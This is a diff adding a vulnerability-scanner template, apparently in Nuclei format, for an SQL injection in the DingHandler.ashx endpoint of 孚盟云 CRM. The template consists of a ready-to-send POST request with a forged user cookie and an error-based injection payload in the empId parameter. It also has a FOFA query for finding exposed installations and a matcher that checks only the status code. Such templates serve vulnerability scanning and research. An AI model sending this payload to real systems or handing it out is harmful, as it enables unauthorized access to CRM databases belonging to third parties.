@@ -1,0 +1,30 @@
+id: poc-rygbp5fkdn2hc1l1
+info:
+  name: 孚盟云CRM DingHandler存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rygbp5fkdn2hc1l1'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rygbp5fkdn2hc1l1
+    fofa: app="孚盟软件-孚盟云"
+http:
+- raw:
+  - 'POST /m/Dingding/Ajax/DingHandler.ashx HTTP/1.1
+
+    Cookie: UserCookie={"empId":"1","corpId": "1"}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    method=getEmpAllMouldByEmpId&empId='')and 1<user--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
